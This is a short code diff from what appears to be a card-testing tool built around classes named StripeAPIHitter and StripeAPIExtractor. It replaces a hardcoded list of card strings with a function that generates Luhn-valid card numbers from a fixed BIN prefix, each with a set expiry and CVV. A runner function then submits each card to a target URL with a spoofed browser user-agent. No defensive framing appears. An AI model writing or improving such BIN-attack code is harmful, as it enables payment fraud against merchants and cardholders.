@@ -6,18 +6,26 @@ from hitter_core import StripeAPIHitter, StripeAPIExtractor
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
-CARDS = [
-    "4154644402330002|05|2028|378",
-    "4154644402330011|05|2028|378",
-    "4154644402330020|05|2028|378",
-    "4154644402330039|05|2028|378",
-    "4154644402330048|05|2028|378",
-    "4154644402330057|05|2028|378",
-    "4154644402330066|05|2028|378",
-    "4154644402330075|05|2028|378",
-    "4154644402330084|05|2028|378",
-    "4154644402330093|05|2028|378",
-]
+def generate_luhn_cards(bin_prefix: str, count: int = 10):
+    cards = []
+    i = 100
+    while len(cards) < count:
+        body = f"{bin_prefix}{i:03d}"
+        digits = [int(d) for d in body]
+        total = 0
+        for idx, d in enumerate(reversed(digits)):
+            if idx % 2 == 0:
+                doubled = d * 2
+                total += doubled - 9 if doubled > 9 else doubled
+            else:
+                total += d
+        check_digit = (10 - (total % 10)) % 10
+        full_cc = f"{body}{check_digit}"
+        cards.append(f"{full_cc}|05|2028|378")
+        i += 7
+    return cards
+
+CARDS = generate_luhn_cards("415464440233", 10)
 
 async def run_single_card(url: str, card_str: str, index: int):
     parts = card_str.split("|")
